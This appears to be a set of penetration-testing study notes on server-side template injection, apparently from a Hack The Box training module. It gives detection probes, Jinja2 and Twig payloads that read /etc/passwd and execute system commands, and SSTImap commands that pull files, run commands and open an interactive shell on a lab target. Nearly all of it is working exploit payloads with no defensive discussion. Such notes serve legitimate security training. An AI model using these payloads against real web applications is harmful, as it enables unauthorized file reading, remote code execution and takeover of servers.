# Confirming SSTI

- injecting

```sh
${{<%[%'"}}%\.
```

- we start by using this payload

```sh
${7*7}
```

```sh
a{*comment*}b
```

```sh
{{7*7}}
```

```sh
${"z".join("ab")}
```

```sh
{{7*'7'}}
```

![img|847](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/145/ssti/diagram.png)


# Exploiting SSTI - Jinja2

- obtain internal information about the web application

```js
{{ config.items() }}
```

- Dump all available built-in functions

```js
{{ self.__init__.__globals__.__builtins__ }}
```

- getting LFI

```sh
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

- Getting RCE

```sh
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

# Exploiting SSTI - Twig

- obtain a little information about the current template

```js
{{ _self }}
```

- Getting LFI

```js
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

- Getting RCE

```js
{{ ['id'] | filter('system') }}
```

other payloads can be find in : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

# SSTI Tools

- [SSTImap](https://github.com/vladko312/SSTImap)

```sh
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

- can download a remote file to our local machine

```sh
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

- execute a system command

```sh
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

- obtain an interactive shell

```sh
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```